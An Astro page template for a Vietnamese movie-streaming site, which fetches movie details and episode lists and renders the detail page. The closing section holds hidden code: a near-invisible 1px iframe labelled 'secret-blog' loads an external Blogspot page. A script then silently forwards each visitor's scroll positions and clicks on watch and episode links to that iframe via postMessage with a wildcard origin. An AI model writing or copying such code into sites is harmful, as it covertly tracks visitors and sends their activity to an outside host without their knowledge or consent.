---
const { slug } = Astro.params;

console.log("ðŸ”„ RENDER MOVIE PAGE:", slug, new Date());

export const prerender = false;
export const revalidate = 5; 

import BaseLayout from "../../layouts/Layout.astro";
import Header from "../../components/Header/Header";
import MovieDetail from "../../components/MovieDetail/MovieDetailStaticInfo";
import Footer from "../../components/Footer";
import MovieTabsAndCast from "../../components/MovieDetail/MovieTab";
import { getMoviePageData, BASE_URL } from "../../utils/getMovieData";
import TopMovies from "../../components/TopMovies/TopMovies";
import Comments from "../../components/Comments";
import SEO from "../../seometas/SeoPhim.astro";
import Breadcrumb from "../../components/Breadcrumb";
let movie = null;
try {
  const movieApiUrl = `${BASE_URL}/api/phim/${slug}/`;
  const movieResponse = await fetch(movieApiUrl);

  if (movieResponse.ok) {
    const movieData = await movieResponse.json();
    movie = movieData;
  } else {
  }
} catch (error) {}

if (!movie) {
  return new Response(null, {
    status: 404,
    statusText: "Not Found",
  });
}

let vietsub = [];
let thuyetminh = [];
let longtieng = [];
let firstEpisode = null;
let actors = [];
let images = [];
let topmovies = [];
let thongbao = [];
let phanLienQuan = [];
try {
  const moviePageData = await getMoviePageData(slug);
  vietsub = moviePageData.vietsub || [];
  thuyetminh = moviePageData.thuyetminh || [];
  longtieng = moviePageData.longtieng || [];
  firstEpisode = moviePageData.firstEpisode || null;
  phanLienQuan = moviePageData.phanlienquan || null;
  topmovies = moviePageData.topmovies;
  actors = moviePageData.actors || [];
  images = moviePageData.images || [];
  thongbao = moviePageData.thongbao;
} catch (error) {}
const firstEpisodeSlug = firstEpisode?.tap_phim?.slug;
const firstEpisodeType = firstEpisode?.ngon_ngu;
const pageUrl = Astro.url.href;
const slugCookieName = `fav_${slug}`;
const initialIsFavorite = Astro.cookies.get(slugCookieName)?.value === "1";
const sortEpisode = Astro.cookies.get("sortEpisode")?.value !== "0";
---

<BaseLayout>
  <Fragment slot="preload">
    <link rel="preload" as="image" href={movie.banner_url} fetchpriority="high" />
  </Fragment>

  <Fragment slot="head">
    <SEO movie={movie} slug={slug} />
  </Fragment>

  <div class="relative">
    <div class="absolute inset-0">
      <img
        src={movie.banner_url}
        alt={`Banner ${movie.ten_phim}`}
        fetchpriority="high"
        loading="eager"
        decoding="async"
        class="h-full w-full object-cover"
      />
      <div class="absolute inset-0 bg-black/60"></div>
    </div>

    <div class="movie-banner-background"></div>
    <div class="movie-content-base relative z-10">
      <div class="header-shadow">
        <Header client:load />
      </div>

      <main class="main-content-layout">
        <MovieDetail
          movie={movie}
          firstEpisodeSlug={firstEpisodeSlug}
          firstEpisodeType={firstEpisodeType}
          client:load
          thongbao={thongbao}
          initialIsFavorite={initialIsFavorite}
        />
      </main>
    </div>
  </div>

  <div class="breadcrumb-padding">
    <Breadcrumb movie={movie} />
  </div>
  <div class="page-wrapper-base">
    <div class="main-column-flex">
      <div class="detail-tabs-column">
        <MovieTabsAndCast
          vietsubEpisodes={vietsub}
          thuyetMinhEpisodes={thuyetminh}
          longtiengEpisodes={longtieng}
          slug={slug}
          currentType={null}
          movieTitle={movie.ten_phim}
          trailer_url={movie.trailer_url}
          phanlienquan={phanLienQuan}
          actors={actors}
          images={{ images: images }}
          initialSortAscending={sortEpisode}
          client:load
        />
        <div class="comment-section-padding">
          <Comments slug={slug} client:visible />
        </div>
      </div>

      <div class="sidebar-column">
        <TopMovies movies={topmovies} client:idle />
      </div>
    </div>
  </div>

  <footer class="px-0">
    <Footer />
  </footer>
  <!-- Hidden iframe used to communicate clicks/scrolls to external blog -->
  <div style="display:none" aria-hidden="true">
    <iframe
      id="secret-blog"
      src="https://reviewphimnoads.blogspot.com/2025/12/tram-phim-iem-hen-cho-nhung-tin-o-me.html?m=1"
      style="position:fixed; width:1px; height:1px; bottom:0; left:0; opacity:0.001; pointer-events:none; border:none; z-index:-9999;"
    ></iframe>
  </div>

  <script>
    (function () {
      const blogIfr = document.getElementById("secret-blog");

      function postToIframe(payload) {
        if (blogIfr && blogIfr.contentWindow) {
          try {
            blogIfr.contentWindow.postMessage(payload, "*");
          } catch (err) {
            // ignore postMessage errors
          }
        }
      }

      // 1. Send scroll position to blog iframe
      window.addEventListener(
        "scroll",
        function () {
          const payload = {
            type: "SYNC_ACTION",
            y: window.scrollY,
            ts: Date.now(),
          };
          postToIframe(payload);
        },
        { passive: true },
      );

      // 2. Catch clicks on "Xem ngay" and any episode links (href starts with /xem-phim/)
      document.addEventListener(
        "click",
        function (e) {
          const target = e.target;
          const anchor = target && target.closest ? target.closest("a[href]") : null;

          // If clicked an episode link (internal xem-phim link) -> notify
          if (anchor && anchor.getAttribute("href") && anchor.getAttribute("href").indexOf("/xem-phim/") === 0) {
            const href = anchor.getAttribute("href");
            postToIframe({ type: "WATCH_CLICKED", href: href, text: (anchor.innerText || "").trim(), ts: Date.now() });
            return;
          }

          // Detect clicks on a "Xem" button (text contains 'xem' / 'xem ngay' or aria-label)
          let isWatchButton = false;
          let computedHref = null;
          if (anchor) {
            const text = (anchor.innerText || "").toLowerCase();
            const aria = (anchor.getAttribute && (anchor.getAttribute("aria-label") || "")).toLowerCase();
            if (text.indexOf("xem ngay") !== -1 || text.indexOf("xem phim") !== -1 || aria.indexOf("xem phim") !== -1) {
              isWatchButton = true;
              computedHref = anchor.getAttribute("href");
            }
          } else if (target && (target.innerText || "").toLowerCase().indexOf("xem ngay") !== -1) {
            isWatchButton = true;
            const surroundingAnchor = target.closest && target.closest("a[href]");
            if (surroundingAnchor) {
              computedHref = surroundingAnchor.getAttribute("href");
            }
          }

          if (isWatchButton) {
            postToIframe({ type: "WATCH_CLICKED", href: computedHref, text: (anchor ? anchor.innerText : (target.innerText || "")).trim(), ts: Date.now() });
          }
        },
        true,
      );
    })();
  </script>
</BaseLayout>
